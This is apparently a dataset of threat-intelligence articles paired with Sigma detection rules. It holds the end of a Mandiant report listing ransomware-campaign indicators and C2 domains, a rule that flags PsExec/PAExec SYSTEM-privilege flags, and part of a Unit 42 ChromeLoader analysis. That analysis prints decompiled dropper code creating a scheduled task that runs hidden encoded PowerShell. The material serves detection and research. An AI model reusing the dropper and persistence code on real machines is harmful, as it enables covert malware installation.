limiting the number of potential accounts, you provide detection opportunities and opportunities to slow the actor.\n- Block internet access for servers where possible. Often times there is no business need for servers, especially AD infrastructure systems, to access the Internet. The actors often choose high-uptime servers for the deployment of post-exploitation tools such as BEACON.\n- Block uncategorized and newly registered domains using web proxies or DNS filters. Often the final payload delivered via phishing is hosted on a compromised third-party website that does not have a business categorization.\n- Ensure that critical patches are installed on Windows systems as well as network infrastructure. We have observed attackers exploiting well-known vulnerabilities such as Zerologon (CVE-2020-1472) to escalate privileges in an environment prior to deploying ransomware. In other cases, possibly unrelated to UNC1878, we have observed threat actors gain access to an environment through vulnerable VPN infrastructure before deploying ransomware.\n\nFor more intelligence on ransomware and other threats, please register for Mandiant Advantage Free, a no-cost version of our threat intelligence platform. Check out this episode of *State of the Hack* for additional information on this threat.\n\n## Campaign Indicators\n\n### Sample Email Subjects / Patterns\n\n- `<(first|last)-name>: Important Information`\n- `<Company Name>`\n- `<Company Name> complaint`\n- `<(first|last)-name>`\n- Agreement cancellation message\n- Agreement suspension notice\n- Contract cancellation reminder\n- FW: `<Name>` Annual Bonus Report is Ready\n- RE: `<(first|last)-name>`: Your Payslip for October\n- RE: `<Company Name>` Employee Survey\n- RE: `<Name>` termination list\n- RE: `<Company Name>` office\n- RE: Urgent `<Company Name>` Employee Internal Survey\n- RE: Working schedule adjustment\n- RE: Your Payslip for September\n\n### Example Malware Family MD5s\n\n- **KEGTAP**\n  - `df00d1192451268c31c1f8568d1ff472`\n- **BEERBOT**\n  - `6c6a2bfa5846fab374b2b97e65095ec9`\n- **SINGLEMALT**\n  - `37aa5690094cb6d638d0f13851be4246`\n- **STILLBOT**\n  - `3176c4a2755ae00f4fffe079608c7b25`\n- **WINEKEY**\n  - `9301564bdd572b0773f105287d8837c4`\n- **CORKBOT**\n  - `0796f1c1ea0a142fc1eb7109a44c86cb`\n\n### Code Signing Certificate CNs\n\n- ARTBUD RADOM SP Z O O\n- BESPOKE SOFTWARE SOLUTIONS LIMITED\n- Best Fud, OOO\n- BlueMarble GmbH\n- CHOO FSP, LLC\n- Company Megacom SP Z O O\n- ESTELLA, OOO\n- EXON RENTAL SP Z O O\n- Geksan LLC\n- GLOBAL PARK HORIZON SP Z O O\n- Infinite Programming Limited\n- James LTH d.o.o.\n- Logika OOO\n- MADAS d.o.o.\n- MUSTER PLUS SP Z O O\n- NEEDCODE SP Z O O\n- Nordkod LLC\n- NOSOV SP Z O O\n- OOO MEP\n- PLAN CORP PTY LTD\n- REGION TOURISM LLC\n- RESURS-RM OOO\n- Retalit LLC\n- Rumikon LLC\n- SNAB-RESURS, OOO\n- TARAT d.o.o.\n- TES LOGISTIKA d.o.o.\n- VAS CO PTY LTD\n- VB CORPORATE PTY. LTD.\n- VITA-DE d.o.o.\n\n## UNC1878 Indicators\n\nA significant proportion of the post-compromise activity associated with these campaigns has involved the distribution of RYUK ransomware by a threat group tracked by Mandiant as UNC1878. As such, we are releasing indicators associated with this group.\n\n### BEACON C2s\n\n| First Seen | Domain                         |\n| ---------- | ------------------------------ |\n| 12/11/19   | updatemanagir[.]us             |\n| 12/20/19   | cmdupdatewin[.]com             |\n| 12/26/19   | scrservallinst[.]info          |\n| 1/10/20    | winsystemupdate[.]com          |\n| 1/11/20    | jomamba[.]best                 |\n| 1/13/20    | updatewinlsass[.]com           |\n| 1/16/20    | winsysteminfo[.]com            |\n| 1/20/20    | livecheckpointsrs[.]com        |\n| 1/21/20    | ciscocheckapi[.]com            |\n| 1/28/20    | timesshifts[.]com              |\n| 1/29/20    | cylenceprotect[.]com           |\n| 1/30/20    | sophosdefence[.]com            |\n| 1/30/20    | taskshedulewin[.]com           |\n| 1/30/20    | windefenceinfo[.]com           |\n| 1/30/20    | lsasswininfo[.]com             |\n| 1/30/20    | update-wind[.]com              |\n| 1/30/20    | lsassupdate[.]com              |\n| 1/30/20    | renovatesystem[.]com           |\n| 1/31/20    | updatewinsoftr[.]com           |\n| 2/2/20     | cleardefencewin[.]com          |\n| 2/2/20     | checkwinupdate[.]com           |\n| 2/2/20     | havesetup[.]net                |\n| 2/3/20     | update-wins[.]com              |\n| 2/3/20     | conhostservice[.]com           |\n| 2/4/20     | microsoftupdateswin[.]com      |\n| 2/4/20     | iexploreservice[.]com          |\n| 2/12/20    | avrenew[.]com                  |\n| 2/12/20    | target-support[.]online        |\n| 2/12/20    | web-analysis[.]live            |\n| 2/14/20    | freeallsafe[.]com              |\n| 2/17/20    | windefens[.]com                |\n| 2/17/20    | defenswin[.]com                |\n| 2/17/20    | easytus[.]com                  |\n| 2/17/20    | greattus[.]com                 |\n| 2/17/20    | livetus[.]com                  |\n| 2/17/20    | comssite[.]com                 |\n| 2/17/20    | findtus[.]com                  |\n| 2/17/20    | bigtus[.]com                   |\n| 2/17/20    | aaatus[.]com                   |\n| 2/17/20    | besttus[.]com                  |\n| 2/17/20    | firsttus[.]com                 |\n| 2/17/20    | worldtus[.]com                 |\n| 2/26/20    | freeoldsafe[.]com              |\n| 2/26/20    | serviceupdates[.]net           |\n| 2/26/20    | topserviceupdater[.]com        |\n| 2/27/20    | myserviceupdater[.]com         |\n| 2/29/20    | myservicebooster[.]net         |\n| 2/29/20    | servicesbooster[.]org          |\n| 2/29/20    | brainschampions[.]com          |\n| 2/29/20    | myservicebooster[.]com         |\n| 2/29/20    | topservicesbooster[.]com       |\n| 2/29/20    | servicesbooster[.]com          |\n| 2/29/20    | topservicesecurity[.]org       |\n| 2/29/20    | topservicesecurity[.]net       |\n| 2/29/20    | topsecurityservice[.]net       |\n| 2/29/20    | myyserviceupdater[.]com        |\n| 2/29/20    | topservicesupdate[.]com        |\n| 2/29/20    | topservicesecurity[.]com       |\n| 2/29/20    | servicesecurity[.]org          |\n| 2/29/20    | myserviceconnect[.]net         |\n| 3/2/20     | topservicesupdates[.]com       |\n| 3/2/20     | yoursuperservice[.]com         |\n| 3/2/20     | topservicehelper[.]com         |\n| 3/2/20     | serviceuphelper[.]com          |\n| 3/2/20     | serviceshelpers[.]com          |\n| 3/2/20     | boostsecuritys[.]com           |\n| 3/3/20     | hakunamatatata[.]com           |\n| 3/8/20     | service-updater[.]com          |\n| 3/9/20     | secondserviceupdater[.]com     |\n| 3/9/20     | twelvethserviceupdater[.]com   |\n| 3/9/20     | twentiethservicehelper[.]com   |\n| 3/9/20     | twelfthservicehelper[.]com     |\n| 3/9/20     | tenthservicehelper[.]com       |\n| 3/9/20     | thirdserviceupdater[.]com      |\n| 3/9/20     | thirdservicehelper[.]com       |\n| 3/9/20     | tenthserviceupdater[.]com      |\n| 3/9/20     | thirteenthservicehelper[.]com  |\n| 3/9/20     | seventeenthservicehelper[.]com |\n| 3/9/20     | sixteenthservicehelper[.]com   |\n| 3/9/20     | sixthservicehelper[.]com       |\n| 3/9/20     | seventhservicehelper[.]com     |\n| 3/9/20     | seventhserviceupdater[.]com    |\n| 3/9/20     | sixthserviceupdater[.]com      |\n| 3/9/20     | secondservicehelper[.]com      |\n| 3/9/20     | ninthservicehelper[.]com       |\n| 3/9/20     | ninethserviceupdater[.]com     |\n| 3/9/20     | fourteenthservicehelper[.]com  |\n| 3/9/20     | fourthserviceupdater[.]com     |\n| 3/9/20     | firstserviceupdater[.]com      |\n| 3/9/20     | firstservisehelper[.]com       |\n| 3/9/20     | fifthserviceupdater[.]com      |\n| 3/9/20     | eleventhserviceupdater[.]com   |\n| 3/9/20     | fifthservicehelper[.]com       |\n| 3/9/20     | fourservicehelper[.]com        |\n| 3/9/20     | eighthservicehelper[.]com      |\n| 3/9/20     | eighteenthservicehelper[.]com  |\n| 3/9/20     | eighthserviceupdater[.]com     |\n| 3/9/20     | fifteenthservicehelper[.]com   |\n| 3/9/20     | nineteenthservicehelper[.]com  |\n| 3/9/20     | eleventhservicehelper[.]com    |\n| 3/14/20    | thirdservice-developer[.]com   |\n| 3/14/20    | fifthservice-developer[.]com   |\n| 3/15/20    | firstservice-developer[.]com   |\n| 3/16/20    | fourthservice-developer[.]com  |\n| 3/16/20    | ninethservice-developer[.]com  |\n| 3/16/20    | seventhservice-developer[.]com |\n| 3/16/20    | secondservice-developer[.]com  |\n| 3/16/20    | sixthservice-developer[.]com   |\n| 3/16/20    | tenthservice-developer[.]com   |\n| 3/16/20    | eithtservice-developer[.]com   |\n| 3/17/20    | servicedupdater[.]com          |\n| 3/17/20    | service-updateer[.]com         |\n| 3/19/20    | sexyservicee[.]com             |\n| 3/19/20    | serviceboostnumberone[.]com    |\n| 3/19/20    | servicedbooster[.]com          |\n| 3/19/20    | service-hunter[.]com           |\n| 3/19/20    | servicedhunter[.]com           |\n| 3/19/20    | servicedpower[.]com            |\n| 3/19/20    | sexycservice[.]com             |\n| 3/23/20    | yourserviceupdater[.]com       |\n| 3/23/20    | top-serviceupdater[.]com       |\n| 3/23/20    | top-servicebooster[.]com       |\n| 3/23/20    | serviceshelps[.]com            |\n| 3/23/20    | servicemonsterr[.]com          |\n| 3/23/20    | servicehunterr[.]com           |\n| 3/23/20    | service-helpes[.]com           |\n| 3/23/20    | servicecheckerr[.]com          |\n| 3/23/20    | newservicehelper[.]com         |\n| 3/23/20    | huntersservice[.]com           |\n| 3/23/20    | helpforyourservice[.]com       |\n| 3/23/20    | boostyourservice[.]com         |\n| 3/26/20    | developmasters[.]com           |\n| 3/26/20    | actionshunter[.]com            |\n| 5/4/20     | info-develop[.]com             |\n| 5/4/20     | ayechecker[.]com               |\n| 5/4/20     | service-booster[.]com          |\n| 9/18/20    | zapored[.]com                  |\n| 9/22/20    | gtrsqer[.]com                  |\n| 9/22/20    | chalengges[.]com               |\n| 9/22/20    | caonimas[.]com                 |\n| 9/22/20    | hakunaman[.]com                |\n| 9/22/20    | getinformationss[.]com         |\n| 9/22/20    | nomadfunclub[.]com             |\n| 9/22/20    | harddagger[.]com               |\n| 9/22/20    | errvghu[.]com                  |\n| 9/22/20    | reginds[.]com                  |\n| 9/22/20    | gameleaderr[.]com              |\n| 9/22/20    | razorses[.]com                 |\n| 9/22/20    | vnuret[.]com                   |\n| 9/22/20    | regbed[.]com                   |\n| 9/22/20    | bouths[.]com                   |\n| 9/23/20    | ayiyas[.]com                   |\n| 9/23/20    | serviceswork[.]net             |\n| 9/23/20    | moonshardd[.]com               |\n| 9/23/20    | hurrypotter[.]com              |\n| 9/23/20    | biliyilish[.]com               |\n| 9/23/20    | blackhoall[.]com               |\n| 9/23/20    | checkhunterr[.]com             |\n| 9/23/20    | daggerclip[.]com               |\n| 9/23/20    | check4list[.]com               |\n| 9/24/20    | chainnss[.]com                 |\n| 9/29/20    | hungrrybaby[.]com              |\n| 9/30/20    | martahzz[.]com                 |\n| 10/1/20    | jonsonsbabyy[.]com             |\n| 10/1/20    | wondergodst[.]com              |\n| 10/1/20    | zetrexx[.]com                  |\n| 10/1/20    | tiancaii[.]com                 |\n| 10/1/20    | cantliee[.]com                 |\n| 10/1/20    | realgamess[.]com               |\n| 10/1/20    | maybebaybe[.]com               |\n| 10/1/20    | saynoforbubble[.]com           |\n| 10/1/20    | chekingking[.]com              |\n| 10/1/20    | rapirasa[.]com                 |\n| 10/1/20    | raidbossa[.]com                |\n| 10/1/20    | mountasd[.]com                 |\n| 10/1/20    | puckhunterrr[.]com             |\n| 10/1/20    | pudgeee[.]com                  |\n| 10/1/20    | loockfinderrs[.]com            |\n| 10/1/20    | lindasak[.]com                 |\n| 10/1/20    | bithunterr[.]com               |\n| 10/1/20    | voiddas[.]com                  |\n| 10/1/20    | sibalsakie[.]com               |\n| 10/1/20    | giveasees[.]com                |\n| 10/1/20    | shabihere[.]com                |\n| 10/1/20    | tarhungangster[.]com           |\n| 10/1/20    | imagodd[.]com                  |\n| 10/1/20    | raaidboss[.]com                |\n| 10/1/20    | sunofgodd[.]com                |\n| 10/1/20    | rulemonster[.]com              |\n| 10/1/20    | loxliver[.]com                 |\n| 10/1/20    | servicegungster[.]com          |\n| 10/1/20    | kungfupandasa[.]com            |\n| 10/2/20    | check1domains[.]com            |\n| 10/5/20    | sweetmonsterr[.]com            |\n| 10/5/20    | qascker[.]com                  |\n| 10/7/20    | remotessa[.]com                |\n| 10/7/20    | cheapshhot[.]com               |\n| 10/7/20    | havemosts[.]com                |\n| 10/7/20    | unlockwsa[.]com                |\n| 10/7/20    | sobcase[.]com                  |\n| 10/7/20    | zhameharden[.]com              |\n| 10/7/20    | mixunderax[.]com               |\n| 10/7/20    | bugsbunnyy[.]com               |\n| 10/7/20    | fastbloodhunter[.]com          |\n| 10/7/20    | serviceboosterr[.]com          |\n| 10/7/20    | servicewikii[.]com             |\n| 10/7/20    | secondlivve[.]com              |\n| 10/7/20    | quwasd[.]com                   |\n| 10/7/20    | luckyhunterrs[.]com            |\n| 10/7/20    | wodemayaa[.]com                |\n| 10/7/20    | hybriqdjs[.]com                |\n| 10/7/20    | gunsdrag[.]com                 |\n| 10/7/20    | gungameon[.]com                |\n| 10/7/20    | servicemount[.]com             |\n| 10/7/20    | servicesupdater[.]com          |\n| 10/7/20    | service-boosterr[.]com         |\n| 10/7/20    | serviceupdatter[.]com          |\n| 10/7/20    | dotmaingame[.]com              |\n| 10/12/20   | backup1service[.]com           |\n| 10/13/20   | bakcup-monster[.]com           |\n| 10/13/20   | bakcup-checker[.]com           |\n| 10/13/20   | backup-simple[.]com            |\n| 10/13/20   | backup-leader[.]com            |\n| 10/13/20   | backup-helper[.]com            |\n| 10/13/20   | service-checker[.]com          |\n| 10/13/20   | nasmastrservice[.]com          |\n| 10/14/20   | service-leader[.]com           |\n| 10/14/20   | nas-simple-helper[.]com        |\n| 10/14/20   | nas-leader[.]com               |\n| 10/14/20   | boost-servicess[.]com          |\n| 10/14/20   | elephantdrrive[.]com           |\n| 10/15/20   | service-hellper[.]com          |\n| 10/16/20   | top-backuphelper[.]com         |\n| 10/16/20   | best-nas[.]com                 |\n| 10/16/20   | top-backupservice[.]com        |\n| 10/16/20   | bestservicehelper[.]com        |\n| 10/16/20   | backupnas1[.]com               |\n| 10/16/20   | backupmastter[.]com            |\n| 10/16/20   | best-backup[.]com              |\n| 10/17/20   | viewdrivers[.]com              |\n| 10/19/20   | topservicebooster[.]com        |\n| 10/19/20   | topservice-masters[.]com       |\n| 10/19/20   | topbackupintheworld[.]com      |\n| 10/19/20   | topbackup-helper[.]com         |\n| 10/19/20   | simple-backupbooster[.]com     |\n| 10/19/20   | top3-services[.]com            |\n| 10/19/20   | backup1services[.]com          |\n| 10/21/20   | backupmaster-service[.]com     |\n| 10/21/20   | backupmasterservice[.]com      |\n| 10/21/20   | service1updater[.]com          |\n| 10/21/20   | driverdwl[.]com                |\n| 10/21/20   | backup1master[.]com            |\n| 10/21/20   | boost-yourservice[.]com        |\n| 10/21/20   | checktodrivers[.]com           |\n| 10/21/20   | backup1helper[.]com            |\n| 10/21/20   | driver1updater[.]com           |\n| 10/21/20   | driver1master[.]com            |\n| 10/23/20   | view-backup[.]com              |\n| 10/23/20   | top3servicebooster[.]com       |\n| 10/23/20   | servicereader[.]com            |\n| 10/23/20   | servicehel[.]com               |\n| 10/23/20   | driver-boosters[.]com          |\n| 10/23/20   | service1update[.]com           |\n| 10/23/20   | service-hel[.]com              |\n| 10/23/20   | driver1downloads[.]com         |\n| 10/23/20   | service1view[.]com             |\n| 10/23/20   | backups1helper[.]com           |\n| 10/25/20   | idriveview[.]com               |\n| 10/26/20   | debug-service[.]com            |\n| 10/26/20   | idrivedwn[.]com                |\n| 10/28/20   | driverjumper[.]com             |\n| 10/28/20   | service1boost[.]com            |\n| 10/28/20   | idriveupdate[.]com             |\n| 10/28/20   | idrivehepler[.]com             |\n| 10/28/20   | idrivefinder[.]com             |\n| 10/28/20   | idrivecheck[.]com              |\n| 10/28/20   | idrivedownload[.]com           |\n\n---\n\nPosted in Threat Intelligence, Security & Identity",
    "sigma_rule": {
      "title": "Potential Privilege Escalation To LOCAL SYSTEM",
      "id": "207b0396-3689-42d9-8399-4222658efc99",
      "related": [
        {
          "id": "8834e2f7-6b4b-4f09-8906-d2276470ee23",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM Privileges",
      "references": [
        "https://learn.microsoft.com/en-us/sysinternals/downloads/psexec",
        "https://www.poweradmin.com/paexec/",
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-05-22",
      "modified": "2024-03-05",
      "tags": [
        "attack.resource-development",
        "attack.t1587.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|windash": [
            " -s cmd",
            " -s -i cmd",
            " -i -s cmd",
            " -s pwsh",
            " -s -i pwsh",
            " -i -s pwsh",
            " -s powershell",
            " -s -i powershell",
            " -i -s powershell"
          ]
        },
        "filter_main_exclude_coverage": {
          "CommandLine|contains": [
            "paexec",
            "PsExec",
            "accepteula"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Weird admins that rename their tools",
        "Software companies that bundle PsExec/PAExec with their software and rename it, so that it is less embarrassing"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_susp_psexec_paexec_flags.yml",
    "id": "595"
  },
  {
    "url": "https://unit42.paloaltonetworks.com/chromeloader-malware/",
    "markdown": "# ChromeLoader: New Stubborn Malware Campaign\n\n**Malware**\n\n### Related Products\n\n- Advanced WildFire\n- Cortex XDR\n\n**Published:** July 12, 2022\n**Categories:** Malware, Threat Research\n**Tags:** Adware, Browser hijacker, Choziosi Loader, ChromeBack, ChromeLoader, Infostealer, Malvertising\n\n---\n\n## Executive Summary\n\nIn January 2022, a new browser hijacker/adware campaign named ChromeLoader (also known as Choziosi Loader and ChromeBack) was discovered. Despite using simple malicious advertisements, the malware became widespread, potentially leaking data from thousands of users and organizations.\n\nInstead of more traditional malware like a Windows executable (`.exe`) or Dynamic Link Library (`.dll`), the malware authors used a browser extension as their final payload. The browser extension serves as adware and an infostealer, leaking all of the user’s search engine queries. We discovered significant changes and additions of capabilities throughout this campaign's evolution, and we predict further changes as this campaign continues.\n\nIn this article, we examine the technical details of this malware, focus on the evolution between its different versions and describe changes in its infection process. This article also reviews new variants that have not yet been publicly reported.\n\nPalo Alto Networks customers using Cortex XDR and WildFire receive protections against this newly discovered malware out of the box.\n\n| **Names for malware discussed** | **ChromeLoader, Choziosi Loader, ChromeBack** |\n|---------------------------------|-----------------------------------------------|\n\n---\n\n## Introduction to ChromeLoader Malware\n\nChromeLoader is a multi-stage malware family. Each variant contains different stages throughout its infection chain, but the infection chain often looks quite similar among the different variants, including malicious browser extensions used in all variants.\n\nThe different payload extensions we tracked had a hardcoded version added by the attacker. This labeling routine contributed to the research process, linking the different versions to the same campaign – and by their correct chronological order.\n\nThe various extension versions are related to different variants of this malware. We differentiate the variants not only by the related extension version but also by the techniques used throughout their infection chain and the targeted operating systems.\n\nThe different variants are mentioned in this article by their detection order and referenced throughout this document as follows:\n\n- **Variant 0:** Named that way since it was active before Variant 1 (the first variant that was discovered in the wild). It used AutoHotKey (AHK)-compiled executables and version 1.0 of the Chrome extension. Its first known attack occurred in December. In this article, this variant is discussed fourth (in the section titled “The Real First Windows Variant”).\n- **Variant 1:** Mentioned first (beginning in the “Infection Vector” section). It used versions 2.0-4.4 of the Chrome extension as its payload and a DotNet executable that launches obfuscated PowerShell as its dropper. It was mainly active in January.\n- **Variant 2:** Mentioned third (see the section “Second Windows Variant”). It uses the 6.0 version of the Chrome extension and uses an obfuscated executable as its initial dropper. It has been active since March.\n- **MacOS Variant:** Mentioned second (see the section “MacOS Variant”). This variant focuses on MacOS computers (while other variants target Windows users only). Uses the 6.0 version of the extension. Active since March.\n\n```image\nAlt: The infection chain of the different variants.\nDescription: The image illustrates the infection chain of the ChromeLoader malware variants. It features a flowchart with labeled nodes, starting from a malicious ad or tweet leading to a downloaded file (in DMG or ISO format). This file is associated with a dropper, which subsequently executes an AHK script file. The flow continues to an EXE file connected to a scheduled task, branching off to shell script (SH) and PowerShell (PS) files before culminating in the installation of a Chrome extension (CRX file). The visual structure effectively conveys the multi-stage nature of the malware's infection process.\nTranscription: |\n  Malicious ad or tweet\n          ↓\n   Downloaded file\n          ↓\n    ┌───────────┐\n    │   .ISO    │\n    └───────────┘\n          ↓\n    ┌────────────┐\n    │    .EXE    │\n    └────────────┘\n          ↓\n    Scheduled task\n          ↓\n    ┌────────────┐\n    │    .SH     │\n    └────────────┘\n          ↓\n    ┌────────────┐\n    │    .PS     │\n    └────────────┘\n          ↓\n    ┌────────────┐\n    │    .CRX    │\n    └────────────┘\n          ↓\n    Chrome extension\n```\n\n*Figure 1. The infection chain of the different variants.*\n\n---\n\n## Infection Vector (Variant 1)\n\nThe first variant of ChromeLoader Malware (referred to in the Introduction as Variant 1) was first seen in January 2022.\n\nThe chain of events starts when a user is enticed to download a torrent or a cracked video game through malvertising campaigns on ad sites and social media platforms. The user scans a QR code on these web pages and is redirected to a compromised website that presents an ISO image (an optical disc image file, typically used with CD/DVD). The user downloads the ISO image, mounts it by double-clicking and executes content contained in the mounted ISO image.\n\n*Figure 2. An example of a QR code posted on Twitter.*\n\n```image\nAlt: An example of a download link to the malicious ISO image from the QR code.\nDescription: The image displays a webpage offering a free download of a file titled 'Five Nights at Freddy’s Security Breach'. The page includes a clear 'Download' button and mentions that clicking the button will prompt the user to install a program called SevenZip, which is used for unpacking files. Additionally, the URL at the bottom shows that the file is hosted on an Amazon server, indicating potential malicious content associated with the download.\nTranscription: |\n  FREE\n  File: Five.Nights.at.Freddys.Security.Breach.zip\n  Download Now\n  \n  By clicking the button below you will be prompted to install SevenZip. It is a free application and will allow you to Unpack and use manage your downloads.\n  \n  [Download] [Step 1]\n  \n  https://s3.us-east-2.amazonaws.com/medmixmega/j149/File-Five.Nights.at.Freddys.Security.Breach.zip?utm_source=partner_consent\n```\n\n*Figure 3. An example of a download link to the malicious ISO image from the QR code.*\n\n---\n\n## Deployment\n\nThe downloaded ISO image contains the following:\n\n- **`Microsoft.Win32.TaskScheduler.dll`:** a legitimate .NET DLL signed by Microsoft, used by other .NET programs for integrating with the scheduled tasks mechanism.\n- **Language folders:** contains a resource file used by the mentioned DLL.\n- **`CS_installer.exe` and its config file:** malicious executable written by the malware authors (note that the name might change from one version to another). In some versions, the authors (probably accidentally) left its PDB file, containing its debug data, inside this folder as well.\n- **`_meta.txt`:** a text file found in advanced versions of this malware, containing scrambled ASCII letters.\n\nMost files in this directory are hidden, and the ordinary user will not notice them when opening this directory using Windows File Explorer. The only non-hidden file is `CS_installer.exe`, which tempts the victim to double-click it to complete the software installation download.\n\n```image\nAlt: An example of a mounted malicious ISO image (after selecting “show hidden files”).\nDescription: The image displays a file directory structure of a mounted malicious ISO image. It includes several folders named after different languages (e.g., 'de', 'es', 'fr', etc.) and files such as 'CS_installer.exe', 'CS_installer.exe.config', 'Microsoft.Win32.TaskScheduler.dll', and '_meta.txt'. The 'CS_installer.exe' file is highlighted as the main executable associated with the malware, while 'Microsoft.Win32.TaskScheduler.dll' is a legitimate DLL file. The presence of hidden files and the layout suggest it is designed to mislead users into executing the malicious installer.\nTranscription: |\n  Name                                   Date modified      Type                    Size\n  de                                     1/8/2022 2:08 PM   File folder             -\n  es                                     1/8/2022 2:08 PM   File folder             -\n  fr                                     1/8/2022 2:08 PM   File folder             -\n  it                                     1/8/2022 2:08 PM   File folder             -\n  pl                                     1/8/2022 2:08 PM   File folder             -\n  ru                                     1/8/2022 2:08 PM   File folder             -\n  zh-CN                                  1/8/2022 2:08 PM   File folder             -\n  _meta.txt                              1/11/2022 6:26 PM  Text Document           6 KB\n  CS_installer.exe                       1/10/2022 2:09 PM  Application             50 KB\n  CS_installer.exe.config                1/7/2022 3:58 PM   CONFIG File             1 KB\n  CS_installer.pdb                       1/10/2022 2:09 PM  PDB File                24 KB\n  Microsoft.Win32.TaskScheduler.dll      1/8/2022 2:08 PM   Application extension   326 KB\n```\n\n*Figure 4. An example of a mounted malicious ISO image (after selecting “show hidden files”).*\n\nThe victim launches `CS_installer.exe` by double-clicking it. In most cases, the executable presents the message shown below in Figure 5, indicating that the program failed to execute. However, this is an attempt by the authors to mislead their targets.\n\n```image\nAlt: Message box presented by the dropper, designed to deceive the user.\nDescription: The image displays a Windows message box indicating an error during the installation process, with the text 'Install Error, incompatible system'. The box has two buttons: 'Retry' and 'Cancel', suggesting that the user is prompted to either attempt the installation again or to exit the process. This message is part of a malicious software campaign, designed to deceive users into thinking there is a legitimate installation error.\nTranscription: |\n  Error\n  Install Error, incompatible system\n  \n  [Retry] [Cancel]\n```\n\n*Figure 5. Message box presented by the dropper, designed to deceive the user.*\n\nThe executable is a non-obfuscated program written in .NET, so .NET reflectors can decompile it to read the source code. The code shown in Figure 6 is revealed when the executable is loaded into a reflector. This code creates a scheduled task configured to execute a malicious base64 encoded PowerShell command every ten minutes. The task name is constructed from the `Chrome` string concatenated with a random suffix from the `namesDict` array.\n\n```image\nAlt: An example of decompiled CS_installer.exe source code.\nDescription: The image displays a section of source code written in C#. It illustrates the main method of a program likely related to malware behavior. Key functionalities highlighted in the code include checking for an existing malicious scheduled task, opening a message box to indicate an error, and creating a new task named 'Chrome'. The code suggests that it utilizes Windows Task Scheduler to execute a PowerShell command at regular intervals while obscuring its execution from the user.\nTranscription: |\n  private static void Main(string[] args)\n  {\n      if (Program.MessageBox((IntPtr)0, \"Install Error, incompatible system\", \"Error\", 5) == 99)\n      {\n          Environment.Exit(0);\n      }\n      using (TaskService ts = new TaskService())\n      {\n          using (IEnumerator<Task> enumerator = TaskService.AllTasks.GetEnumerator())\n          {\n              while (enumerator.MoveNext())\n              {\n                  if (enumerator.Current.Definition.Actions[0].ToString().Contains(\"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E\"))\n                  {\n                      Environment.Exit(0);\n                  }\n              }\n          }\n      }\n      TaskDefinition td = ts.NewTask();\n      td.RegistrationInfo.Description = \"Example task\";\n      td.Triggers.Add(new TimeTrigger(DateTime.Now.AddMinutes(1.0))\n      {\n          Repetition = new RepetitionPattern(TimeSpan.FromMinutes(10.0), TimeSpan.Zero, false)\n      });\n      string script = Program.deScramble();\n      td.Actions.Add(new ExecAction(\"cmd\", \"/c start /min \\\"\\\" powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E \" + script, null));\n      string[] namesDict = new string[]\n      {\n          \"Loader\",\n          \"Monitor\",\n          \"Checker\",\n          \"Conf\",\n          \"Task\",\n          \"Updater\"\n      };\n      int nameIndex = new Random().Next(namesDict.Length);\n      string taskName = \"Chrome\" + namesDict[nameIndex];\n      ts.RootFolder.RegisterTaskDefinition(taskName, td);\n  }\n```\n\n*Figure 6. An example of decompiled CS_installer.exe source code.*\n\nThe script content derives from the `_meta.txt` file, unscrambled by the following predefined function below in Figure 7, which applies simple character replacement.\n\n```image\nAlt: An example of the unscramble function.\nDescription: The image displays a snippet of C# source code showing a decryption or unscrambling function. The code iterates through the characters of a text file named '_meta.txt', checking if each character exists in a dictionary called 'replaceDict'. If a match is found, the character is replaced; otherwise, it is appended to the result as is. The returning variable 'res' accumulates the final unscrambled string.\nTranscription: |\n  {\n      'k',\n      'Z'\n  },\n  {\n      '4',\n      '='\n  };\n  foreach (char c in File.ReadAllText(\"_meta.txt\"))\n  {\n      if (replaceDict.ContainsKey(c))\n      {\n          res += replaceDict[c].ToString();\n      }\n      else\n      {\n          res += c.ToString();\n      }\n  }\n  return res;\n```\n\n*Figure 7. An example of the unscramble function.*\n\nSome of the features mentioned were missing in earlier versions of this variant of the malware. For instance, in the version shown in Figure 8, which was discovered only one week before the version mentioned in Figures 6 and 7, the authors did not use a descramble function but simply hardcoded the encoded PowerShell script in the .NET executable and used the predefined `ChromeLoader` name for their task instead of generating a more randomized suffix.\n\n```image\nAlt: An example of source code from an older version of Variant 1.\nDescription: The image depicts a snippet of C# code from a decompiled .NET executable associated with the ChromeLoader malware. The code contains a method that appears to handle task scheduling using the Windows Task Scheduler. It includes checks for specific conditions related to the PowerShell execution policy and sets up a scheduled task to execute a base64 encoded PowerShell script every ten minutes. The script variable at the end contains a long string of encoded data, likely representing the malicious actions to be performed.\nTranscription: |\n  private static void Main(string[] args)\n  {\n      if (Program.MessageBox((IntPtr)0, \"Install Error, incompatible system\", \"Error\", 5) == 99)\n          Environment.Exit(0);\n  \n      using (TaskService ts = new TaskService())\n      {\n          using (IEnumerator<Task> enumerator = ts.AllTasks.GetEnumerator())\n          {\n              while (enumerator.MoveNext())\n              {\n                  if (enumerator.Current.Definition.Actions[0].ToString().Contains(\"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E\"))\n                  {\n                      Environment.Exit(0);\n                  }\n              }\n              TaskDefinition td = ts.NewTask();\n              td.RegistrationInfo.Description = \"Example task\";\n              td.Triggers.Add(new TimeTrigger(DateTime.Now.AddMinutes(1.0)));\n              RepetitionPattern repetition = new RepetitionPattern(TimeSpan.FromMinutes(10.0), TimeSpan.Zero, false);\n              string script = \"JAIBgAdABgAEdABoACAApAgAIAAAoACQBAgAIAAAoACQBAgAIAAAoACQBAgAIAAAoACQBAgAIAAAoACQBAgAIAAAoACQBAgAIA...\n```\n\n*Figure 8. An example of source code from an older version of Variant 1.*\n\nThe attacker uses the encoded PowerShell script for downloading and loading a malicious browser extension into the user’s Chrome browser.\n\n```image\nAlt: An example of variable definition in the PowerShell dropper.\nDescription: The image displays a snippet of PowerShell code, showing variable definitions related to the `ChromeLoader` malware campaign. The variables include paths to the Chrome extension directory, configuration file, a ZIP 